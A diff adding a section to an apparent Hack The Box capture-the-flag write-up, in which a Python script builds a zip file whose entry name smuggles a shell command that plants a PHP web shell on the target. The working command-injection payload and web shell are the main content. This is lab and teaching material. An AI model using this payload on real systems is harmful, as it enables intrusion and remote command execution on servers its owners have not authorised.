@@ -864,7 +864,22 @@ Since we have admin credentials and the target is running version 2.9.8, all con
 
 ### 3.1 Crafting the Malicious Payload
 
+Create the exploit generator script:
 
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
+└─$ vi genex.py  
+
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
+└─$ cat genex.py
+import zipfile
+
+cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'
+malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'
+
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
+```
 <div align="center">
 <br>
 <br>
